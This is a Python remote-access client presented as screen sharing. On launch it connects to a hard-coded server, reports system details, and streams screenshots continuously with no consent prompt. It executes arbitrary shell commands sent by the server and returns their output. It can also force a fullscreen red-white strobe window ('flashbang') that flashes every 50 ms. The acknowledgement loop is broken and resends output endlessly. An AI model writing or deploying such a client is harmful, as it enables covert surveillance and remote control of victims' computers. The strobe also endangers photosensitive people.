import socket
import pyautogui
from PIL import Image
import io
import threading
import time
import platform
import tkinter as tk
import tkinter.font as Font
from tkinter import ttk
from tkinter import messagebox as messagebox
import asyncio
import os
import subprocess

class ScreenSharingClient:
    def __init__(self, server_ip='ENDOSPC', server_port=5001):
        # Existing initialization code
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_screen_sharing = False
        self.screenshot_thread = None
        self.connect_to_server()
        self.current_directory = os.getcwd()
        
    def terminalFunction(self, cmd):
        try:
            if cmd.startswith("cd"):
                new_dir = cmd[3:].strip()
                if new_dir == '/':
                    new_dir = 'C:\\' if os.name == 'nt' else '/'
                new_dir = os.path.abspath(os.path.join(self.current_directory, new_dir))
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.current_directory = new_dir
                    response = f"CMDOUTPUTDirectory changed to: {new_dir}"
                else:
                    response = f"CMDOUTPUTDirectory not found: {new_dir}"
            else:
                # Execute the command synchronously
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=self.current_directory,
                    text=True
                )
                stdout, stderr = process.communicate()
                
                stdout_str = stdout
                stderr_str = stderr
                if process.returncode == 0:
                    response = f"CMDOUTPUT{stdout_str}"
                else:
                    response = f"CMDOUTPUTError: {stderr_str}"

            return response

        except Exception as e:
            error_message = f"CMDOUTPUTError: {e}"
            return error_message

    def connect_to_server(self):
        try:
            self.client_socket.connect((self.server_ip, self.server_port))
            print("Connected to server")
            self.send_system_info()
            threading.Thread(target=self.receive_commands).start()
        except Exception as e:
            print(f"Error connecting to server: {e}")
            self.client_socket.close()

    def send_system_info(self):
        try:
            system_info = self.get_system_info()
            self.client_socket.send(system_info.encode('utf-8'))
            acknowledgment = self.client_socket.recv(1024).decode('utf-8')
            if acknowledgment.lower() == "received":
                self.start_screen_share()
        except Exception as e:
            print(f"Error sending system info: {e}")
            self.client_socket.close()

    def get_system_info(self):
        system_info = {
            'System Name': platform.node(),
            'System': platform.system(),
            'OS Release': platform.release(),
            'OS Version': platform.version(),
            'Machine Type': platform.machine(),
            'CPU': platform.processor()
        }
        return str(system_info)

    def receive_commands(self):
        try:
            while True:
                command = self.client_socket.recv(1024).decode('utf-8')
                if command.lower() == "flashbang":
                    self.trigger_flashbang()
                elif command.lower() == "stop_screenshare":
                    self.stop_screen_share()
                elif command.lower() == "start_screenshare":
                    self.start_screen_share()
                elif command.startswith("message"):
                    message = command[7:]
                    messagebox.showinfo(title="You got a Message", message=message)
                elif command.startswith("CMD"):
                    self.stop_screen_share()
                    cmd = command[3:]
                    print("COMMAND RECEIVED")
                    output = self.terminalFunction(cmd)
                    while True:
                        self.client_socket.send(output.encode('utf-8'))
                        if command.lower() == "received":
                            print("Acknowledgement Received")
                            self.start_screen_share()
                            break
                        elif command.lower() == "not received":
                            print("Command Not Received")
                            continue
        except Exception as e:
            print(f"Error receiving commands: {e}")

    def trigger_flashbang(self):
        if hasattr(self, 'error_box') and self.error_box.winfo_exists():
            return

        self.error_box = tk.Tk()
        black = "#ff0000"
        white = "#ffffff"
        self.error_box.configure(bg=black)
        self.error_box.attributes("-topmost", True)
        self.error_box.attributes("-fullscreen", True)
        self.error_box.overrideredirect(True)
        self.error_box.resizable(False, False)

        def swap_colors():
            if not self.error_box.winfo_exists():
                return
            nonlocal black, white
            black, white = white, black
            self.error_box.configure(bg=black)
            self.error_box.after(50, swap_colors)

        swap_colors()
        self.error_box.mainloop()

    def start_screen_share(self):
        if not self.is_screen_sharing:
            self.is_screen_sharing = True
            self.start_screenshot_thread()

    def stop_screen_share(self):
        if self.is_screen_sharing:
            self.is_screen_sharing = False
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.screenshot_thread.join()

    def start_screenshot_thread(self):
        self.screenshot_thread = threading.Thread(target=self.send_screenshot)
        self.screenshot_thread.start()

    def send_screenshot(self):
        try:
            while self.is_screen_sharing:
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=100)
                data = buffer.getvalue()
                size = len(data)

                self.client_socket.sendall(size.to_bytes(4, 'big'))
                self.client_socket.sendall(data)
                time.sleep(0.001)
        except Exception as e:
            print(f"Error sending screenshot: {e}")

if __name__ == "__main__":
    client = ScreenSharingClient()